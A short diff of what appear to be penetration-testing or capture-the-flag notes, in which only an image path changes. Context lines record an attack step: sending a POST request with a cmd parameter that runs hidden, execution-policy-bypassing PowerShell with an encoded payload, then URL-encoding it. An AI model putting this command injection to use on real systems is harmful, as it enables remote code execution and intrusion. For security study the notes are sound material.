@@ -12,4 +12,4 @@ changed  to post request
 set cmd=powershell -nop -exec bypass -w hidden -e the_string_above
 select all and url encode (ctrl+u)
 
-![[Pasted image 20231209041631.png]]
+![[Images/Pasted image 20231209041631.png]]
